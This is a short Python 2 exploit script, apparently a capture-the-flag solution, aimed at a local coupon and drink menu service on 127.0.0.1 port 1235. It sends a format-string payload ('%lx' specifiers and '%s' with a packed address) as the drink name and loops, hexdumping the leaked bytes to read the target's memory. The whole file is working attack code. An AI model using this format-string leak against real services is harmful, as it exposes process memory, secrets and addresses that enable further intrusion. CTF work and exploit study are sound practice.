from sock import Sock
import struct, hexdump
s = Sock('127.0.0.1',1235)
addr = 0x100
while True:
    d = s.read_until('[5] Restart\r\n')
    if 'Amount of coupons left: 1' in d:
        s.write("3" + '\r')
        d = s.read_until('What would you like to drink?\r\n')
        s.write('||%lx%lx%lx%lx%lx%lx%lx%lx(%s)||' + struct.pack("<H",addr) + '||' + '\r')
        d = s.read_line()[:-2]
        d = d[d.find('(')+1:]
        d = d[:d.find(')||')] + '\x00'
        print hex(addr)
        hexdump.hexdump(d)
        addr += len(d)
    s.write('\r')
